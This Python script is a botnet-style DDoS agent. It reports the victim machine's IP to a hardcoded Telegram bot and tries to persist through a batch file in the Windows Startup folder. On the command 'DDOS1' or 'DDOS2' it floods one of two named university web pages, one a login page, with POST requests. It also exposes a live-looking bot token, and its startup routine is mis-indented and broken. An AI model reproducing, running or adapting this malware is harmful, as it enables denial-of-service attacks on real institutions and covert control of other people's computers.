import requests , socket , getpass , os ,sys ,time
token , chat_id , url_target1 , url_target2 ,num = "5266751827:AAEfeKkxSPMkEQSdcdmwidMuh9XZhHi5tbY" , "1233004016" , "https://lar.ac.ir/" , "https://edu.lar.ac.ir/X1/SessWay/Script/Login.aspx" , 0
# send meessage def
def send_mess(message):
    url_send = ("https://api.telegram.org/bot"+token+"/SendMessage?chat_id="+chat_id+"&text="+message)
    pyload_send = {
        "UrlBox" : url_send,
        "AgentList" : "Googlebot" ,
        "VersionsList" :"HTTP/1.1",
        "MethodList" : "GET"
    }
    send = requests.post("http://httpdebugger.com/tools/ViewHttpHeaders.aspx" , pyload_send)   
    #wakeup def
    def add_to_startup(file_path=""):
        USER_NAME = getpass.getuser()
    if file_path == "":
        file_path = os.path.dirname(os.path.dirname(__file__))
    bat_path = r'C:\\Users\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup' % USER_NAME
    with open(bat_path + '\\' + "win32.bat", "w+") as bat_file:
        bat_file.write(r'Start "" %s' % file_path)
#check network
while True:
    try:
        time.sleep(3)
        req_check = requests.get("https://www.google.com")
        if req_check.status_code == 200:
            break
        else:
            print("no net")
            continue
    except:
        pass
# send alert 
try:
    send_mess("Install on: "+str(socket.gethostbyname(socket.gethostname())))
except:
    pass
#wakeup
try:
    add_to_startup(sys.argv[0])
except:
    pass
#listing to telegram
try:
    while True:
        try:
            time.sleep(1)
            url_getupdate = "https://api.telegram.org/bot"+token+"/getUpdates?offset=-1?chat_id="+chat_id
            pyload_send ={
                "UrlBox" : url_getupdate,
                "AgentList" : "Googlebot" ,
                "VersionsList" :"HTTP/1.1",
                "MethodList" : "GET"
            }
            send = requests.post("http://httpdebugger.com/tools/ViewHttpHeaders.aspx" , pyload_send).text
            if '"text":"DDOS1"'in send:
                url_target_main = url_target1
                break
            elif '"text":"DDOS2"'in send:
                url_target_main = url_target2
                break
            else:
                print("continue ")
            continue
        except:
            pass
except:
    pass
#Attack
try:
    while True:
        try:
            req = requests.post(url_target_main)
            #time.sleep(1)
            num += 1
            print(num)
            if num == 5:
                send_mess("DDOS Start success!")
            elif num == 10000:
                send_mess("DDOS was success bye 200")
                break
        except:
            pass
except:
    pass